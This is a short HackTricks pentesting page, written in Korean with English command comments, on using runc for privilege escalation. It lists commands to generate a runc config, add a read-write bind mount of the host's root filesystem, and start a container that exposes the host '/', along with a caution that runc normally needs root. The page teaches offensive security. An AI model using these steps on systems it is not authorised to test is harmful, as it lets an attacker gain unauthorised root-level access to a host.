# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

**runc**에 대해 더 알아보려면 다음 페이지를 확인하세요:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

host에 `runc`가 설치되어 있다면 **host의 root / 폴더를 mount하는 container를 실행**할 수 있습니다.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> runc의 기본 동작은 root로 실행하는 것이므로 항상 작동하는 것은 아닙니다. 따라서 권한이 없는 사용자로 실행하면 단순히 작동할 수 없습니다(rootless configuration이 있는 경우는 제외). rootless configuration을 기본값으로 설정하는 것은 일반적으로 좋은 생각이 아닙니다. rootless containers 내부에는 rootless containers 외부에는 적용되지 않는 여러 제한이 있기 때문입니다.

{{#include ../../banners/hacktricks-training.md}}
